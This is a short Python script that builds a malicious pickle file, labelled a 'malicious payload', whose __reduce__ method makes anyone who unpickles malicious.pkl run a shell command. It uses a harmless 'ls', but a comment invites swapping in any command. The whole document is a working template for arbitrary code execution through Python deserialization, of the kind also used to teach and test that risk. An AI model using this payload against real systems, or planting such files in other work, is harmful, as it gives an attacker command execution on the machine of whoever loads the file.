import pickle
import subprocess

# Malicious payload: running `ls` command
class Malicious:
    def __reduce__(self):
        # Replace "ls" with any command you'd like to execute
        return (subprocess.call, (["ls"],))

# Serialize the payload
payload = pickle.dumps(Malicious())

# Save it to a file
with open("malicious.pkl", "wb") as f:
    f.write(payload)
